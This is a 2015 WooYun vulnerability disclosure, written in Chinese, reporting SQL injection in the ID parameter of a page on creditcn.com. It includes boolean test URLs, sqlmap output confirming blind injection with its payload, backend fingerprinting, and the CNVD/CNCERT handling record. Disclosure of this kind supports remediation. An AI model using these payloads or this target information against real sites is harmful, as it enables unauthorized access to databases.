wybug_title: 商务部研究院注入一枚
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-04-22：	细节已通知厂商并且等待厂商处理中									2015-04-27：	厂商已经确认，细节仅向厂商公开									2015-05-07：	细节向核心白帽子及相关领域专家公开									2015-05-17：	细节向普通白帽子公开									2015-05-27：	细节向实习白帽子公开									2015-06-11：	细节向公众公开  简要描述： 商务部研究院注入一枚 详细说明：  http://www.creditcn.com/http://www.creditcn.com/ShowNews1.asp?ID=1334%20and%201=1http://www.creditcn.com/ShowNews1.asp?ID=1334%20and%201=2返回不一样[11:37:08] [INFO] target URL is stable[11:37:08] [INFO] testing if GET parameter 'ID' is dynamic[11:37:08] [INFO] confirming that GET parameter 'ID' is dynamic[11:37:09] [INFO] GET parameter 'ID' is dynamic[11:37:09] [INFO] heuristic (basic) test shows that GET parameter 'ID' might beinjectable (possible DBMS: 'Microsoft Access')[11:37:09] [INFO] testing for SQL injection on GET parameter 'ID'[11:37:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[11:37:09] [WARNING] reflective value(s) found and filtering out[11:37:09] [INFO] GET parameter 'ID' seems to be 'AND boolean-based blind - WHERE or HAVING clause' injectable[11:37:09] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[11:37:09] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[11:37:12] [INFO] checking if the injection point on GET parameter 'ID' is a false positiveGET parameter 'ID' is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection points with a total of 31 HTTP(s) requests:---Place: GETParameter: ID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ID=1335 AND 8683=8683---[11:37:17] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Access[11:37:17] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 24 times

   漏洞证明：     修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-04-27 08:19 厂商回复： CNVD确认并复现所述情况,转由CNCERT向中国国际电子商务中心通报,由其后续协调网站管理单位处置. 最新状态： 暂无
